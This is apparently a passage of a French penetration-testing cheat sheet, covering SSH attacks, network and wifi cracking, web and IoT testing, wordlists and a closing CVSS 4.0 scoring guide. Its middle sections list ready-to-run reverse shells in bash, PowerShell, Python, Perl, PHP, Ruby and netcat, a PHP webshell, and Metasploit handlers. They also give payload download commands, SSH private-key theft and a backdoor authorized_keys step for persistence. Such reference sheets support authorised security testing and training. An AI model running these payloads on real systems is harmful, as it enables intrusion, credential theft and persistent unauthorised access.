ssh-keygen -lf /etc/ssh/ssh_host_rsa_key  # Vérifier force clé

# Authentification par clé
ssh -i id_rsa user@192.168.1.100          # Connexion avec clé privée
chmod 600 id_rsa                          # Corriger permissions si nécessaire

# Anciennes versions (< 7.7) - Username enumeration 
auxiliary/scanner/ssh/ssh_enumusers
python3 ssh_user_enum.py --userlist users.txt 192.168.1.100 2222

# 3. TECHNIQUES SSH AVANCÉES
# Pivoting avec SSH
ssh -D 9050 user@192.168.1.100            # Proxy SOCKS
proxychains nmap -sT 10.0.0.0/24           # Scan via tunnel

# Forwarding de ports
ssh -L 8080:localhost:80 user@192.168.1.100 # Local forwarding
ssh -R 8080:localhost:80 user@192.168.1.100 # Remote forwarding

# Connexion SSH via HTTP proxy
ssh -o ProxyCommand='nc -X connect -x proxy.example.com:8080 %h %p' user@192.168.1.100

# 4. POST-EXPLOITATION SSH
# Extraction et utilisation clés privées
find / -name "id_rsa" 2>/dev/null          # Rechercher clés privées
cat /home/user/.ssh/id_rsa                 # Récupérer clé privée
cp /home/user/.ssh/authorized_keys /tmp    # Récupérer clés autorisées

# Extraction clés depuis agent SSH
ssh-agent
ssh-add -l                                 # Lister clés chargées

# Persistance via SSH
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys # Ajouter clé backdoor

# 5. CHECKLIST SSH PENTEST
# [ ] Vérifier version SSH et vulnérabilités connues
# [ ] Tester algorithmes cryptographiques faibles
# [ ] Rechercher fichiers de clés privées (.id_rsa)
# [ ] Tester bruteforce sur comptes courants
# [ ] Vérifier mauvaise configuration dans sshd_config
# [ ] Tester authentification par mot de passe vs. clé
```

### 🔬 TESTS D'INTRUSION RÉSEAU
```bash
# Responder
responder -I eth0 -wrf                     # Capture NTLM/NTLMv2
responder -I eth0 -v                       # Mode verbeux

# Wireshark filters
http.request.method == "POST"              # Requêtes POST
tcp.port == 80                             # Trafic HTTP
http.request.uri contains "login"          # URIs login

# Aircrack-ng
airmon-ng start wlan0                      # Mode moniteur
airodump-ng wlan0mon                       # Scan réseaux
airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w output wlan0mon # Capture
aircrack-ng -w /usr/share/wordlists/rockyou.txt output*.cap # Cracking
```

### 🛡 SÉCURITÉ WEB
```bash
# OWASP ZAP
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target # Scan rapide

# Burp Suite
# Proxying → Intercept → Capture requests
# Target → Site map → Actively scan this host

# JWT
# https://jwt.io/ pour decoder
jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ # Analyse
```

### 📡 IOT & HARDWARE
```bash
# Bluetooth
btscanner                                  # Scanner Bluetooth
hcitool scan                               # Scan basique
l2ping -c 10 00:11:22:33:44:55             # Ping device

# RFID
mfoc -P 500 -O dump.mfd                    # Capture Mifare Classic
mfcuk -C -R 0:A -s 250 -S 250              # Crack clés
```

---

## PAYLOADS & REVERSE SHELLS

### 🐚 REVERSE SHELLS
```bash
# Bash
bash -i >& /dev/tcp/192.168.1.200/4444 0>&1

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.200',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.200",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.200",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="192.168.1.200";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("192.168.1.200",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php system($_GET['cmd']); ?> # Webshell simple

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.200","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Netcat
nc -e /bin/sh 192.168.1.200 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.200 4444 >/tmp/f # Sans option -e
```

### 📱 HANDLERS
```bash
# Netcat
nc -lvnp 4444                              # Listener basique

# Metasploit
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 4444
exploit

# Socat (shell avec complétion)
socat file:`tty`,raw,echo=0 tcp-listen:4444
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.200:4444
```

### 🔄 TRANSFERT FICHIERS
```bash
# Serveur HTTP
python -m SimpleHTTPServer 8000            # Python 2
python3 -m http.server 8000                # Python 3

# Windows
certutil -urlcache -split -f "http://192.168.1.200:8000/file.exe" file.exe
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.200:8000/file.exe', 'C:\Windows\Temp\file.exe')"
powershell Invoke-WebRequest -Uri "http://192.168.1.200:8000/file.exe" -OutFile "C:\Windows\Temp\file.exe"

# Linux
wget http://192.168.1.200:8000/file
curl -o file http://192.168.1.200:8000/file

# SMB (impacket)
impacket-smbserver share /tmp/share        # Créer partage SMB
copy \\192.168.1.200\share\file.exe C:\file.exe # Copie Windows
```

---

## WORDLISTS & RESSOURCES

### 📚 WORDLISTS & EXEGOL
```bash
# Exegol - Framework pour pentesting
## Installation et utilisation
git clone https://github.com/ThePorgs/Exegol.git
cd Exegol
python3 exegol.py install                  # Installation
python3 exegol.py start my_container       # Démarrer conteneur
python3 exegol.py info                     # Infos disponibles
python3 exegol.py exec my_container        # Accès au shell

## Outils pré-installés dans Exegol
# Reconnaissance:
subfinder -d example.com                   # Énumération sous-domaines
amass enum -d example.com                  # OSINT domaines
nuclei -u https://example.com              # Scanner vulnérabilités

# Exploitation:
crackmapexec smb 192.168.1.0/24            # Énumération SMB
bloodhound-python -d domain.local -u user -p pass # Collecte AD
responder -I eth0                          # Capture NTLM

## Wordlists dans Exegol
/opt/wordlists/passwords/rockyou.txt       # Chemin rockyou dans Exegol
/opt/wordlists/SecLists                    # SecLists complet
/opt/wordlists/directory-list-lowercase-2.3-medium.txt # Web dirs
/opt/wordlists/seclists/Discovery/Web-Content/api_endpoints.txt # API
/opt/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt # Users

## Utilisation avancée
python3 exegol.py install image tag        # Installation image spécifique
python3 exegol.py update                   # Mise à jour
exegol-resources                           # Méta-package avec outils additionnels

# Kali Linux standard
/usr/share/wordlists/rockyou.txt           # Passwords (commun)
/usr/share/wordlists/dirb/big.txt          # Directories web
/usr/share/wordlists/metasploit/unix_users.txt # Utilisateurs Unix

# SecLists (https://github.com/danielmiessler/SecLists)
/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-50.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
/usr/share/wordlists/SecLists/Usernames/Names/names.txt
```

### 🔍 RESSOURCES ADDITIONNELLES
```
# Bases de données vulnérabilités
https://www.exploit-db.com/
https://nvd.nist.gov/vuln/search
https://cve.mitre.org/

# Scripts & Outils
https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/carlospolop/PEASS-ng (linPEAS/winPEAS)
https://github.com/rebootuser/LinEnum
https://github.com/f0rb1dd3n/Reptile (rootkit)
```

### 🗺 CHECKLISTS
```
# Windows Post-Exploitation
[ ] whoami /all
[ ] net users
[ ] systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
[ ] netstat -ano
[ ] tasklist /SVC
[ ] reg query HKLM /f password /t REG_SZ /s

# Web Application
[ ] Directory enumeration
[ ] Hidden parameters
[ ] Default credentials
[ ] SQL Injection
[ ] XSS
[ ] File uploads
[ ] LFI/RFI
[ ] CSRF
```

## 🛠 CLASSIFICATION DES VULNÉRABILITÉS

### 📖 Introduction
Le système **CVSS v4.0** permet de mesurer la gravité d’une vulnérabilité en standardisant le scoring sur plusieurs critères.  
👉 **Calculateur officiel : [https://www.first.org/cvss/calculator/4-0](https://www.first.org/cvss/calculator/4-0)**

Un score **de 0 à 10** sera obtenu selon l’exploitation, l’impact et le contexte.

---

### 🔎 MÉTRIQUES CVSS 4.0 - Comment remplir chaque champ ?

#### 1️⃣ **AV - Attack Vector (Vecteur d'attaque)**
- **N (Network)** : Exploitable à distance sans accès préalable (ex: service HTTP).
- **A (Adjacent)** : Accessible uniquement sur le même réseau (ex: VLAN).
- **L (Local)** : Nécessite un accès local sur la machine.
- **P (Physical)** : Nécessite un accès physique à la machine.

➡️ **Conseil** : Si c’est faisable par internet ou LAN, choisis **N**. Si accès physique requis (**USB, BIOS**), choisis **P**.

---

#### 2️⃣ **AC - Attack Complexity (Complexité de l'attaque)**
- **L (Low)** : Aucun facteur externe, réussite assurée si le vecteur est accessible.
- **H (High)** : Nécessite des conditions spécifiques (race condition, timing, complexité technique rare).

➡️ **Conseil** : Si l’attaque réussit systématiquement -> **Low**. Si elle dépend de la chance ou d’une condition difficile -> **High**.

---

#### 3️⃣ **AT - Attack Requirements (Nouveauté v4.0)**
- **N (None)** : Aucun besoin externe.
- **P (Present)** : Dépend de l'état ou de la configuration de la cible (ex: un service optionnel activé).

➡️ **Conseil** : Si exploitable partout -> **None**. Si besoin d’un module activé ou d’un certain contexte -> **Present**.

---

#### 4️⃣ **PR - Privileges Required**
- **N (None)** : Exploitable sans authentification.
- **L (Low)** : Nécessite un compte basique (user).
- **H (High)** : Nécessite des droits admin/root.

➡️ **Conseil** : Si pas besoin de compte -> **None**. Si admin requis -> **High**.

---

#### 5️⃣ **UI - User Interaction**
- **N (None)** : Aucune interaction utilisateur requise.
- **P (Passive)** : L’utilisateur est ciblé sans interaction (ex: navigation automatique).
- **A (Active)** : Nécessite une action de l’utilisateur (cliquer, ouvrir un fichier).

➡️ **Conseil** : Exploitation en aveugle -> **None**. Si l’utilisateur doit ouvrir un fichier -> **Active**.

---

#### 6️⃣ **VC / VI / VA - Impact sur la Confidentialité, l’Intégrité et la Disponibilité**
Chaque impact peut être :
- **H (High)** : Données sensibles exposées, modification totale, système inutilisable.
- **L (Low)** : Impact partiel ou contournable.
- **N (None)** : Aucun impact.

➡️ **Conseil** :
- Dump complet de BDD -> **VC:H**
- Modification de fichiers -> **VI:H**
- Crash ou déni de service complet -> **VA:H**

---

#### 7️⃣ **SC / SI / SA - Impacts secondaires (Optional - Contextuel)**
- Scope étendu ou changement de périmètre sur **Confidentiality (SC)**, **Integrity (SI)**, **Availability (SA)**.

⚠️ **Remplir si la vulnérabilité propage son impact à d’autres systèmes.**

---

### 📈 EXEMPLE COMPLET DE VECTEUR CVSS 4.0

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
```

- Exploitable depuis internet (AV:N)
- Aucune complexité (AC:L)
- Pas de pré-requis système (AT:N)
- Pas d'authentification nécessaire (PR:N)
- Pas d’interaction utilisateur (UI:N)
- Impact élevé sur Confidentialité, Intégrité et Disponibilité.

---

### 🟠 CONSEIL POUR LE RAPPORT
- **Explique tes choix de score** dans la partie preuve.
- Ajoute systématiquement le vecteur **CVSS** pour **chaque vulnérabilité**.
- Utilise le **calculateur officiel** pour valider le score final :
👉 **https://www.first.org/cvss/calculator/4-0**

---

### ✅ RÉSUMÉ DES NIVEAUX DE SCORE
| Score      | Niveau    | Interprétation                                      |
|----------- |----------|-----------------------------------------------------|
| 9.0 - 10   | Critique | Exploitable facilement, impact maximal              |
| 7.0 - 8.9  | Élevé    | Exploitable avec un impact fort                     |
| 4.0 - 6.9  | Moyen    | Exploitation conditionnelle ou impact modéré        |
| 0.1 - 3.9  | Faible   | Difficile à exploiter ou impact négligeable         |
| 0          | Aucune   | Informatif, sans impact sur la sécurité             |

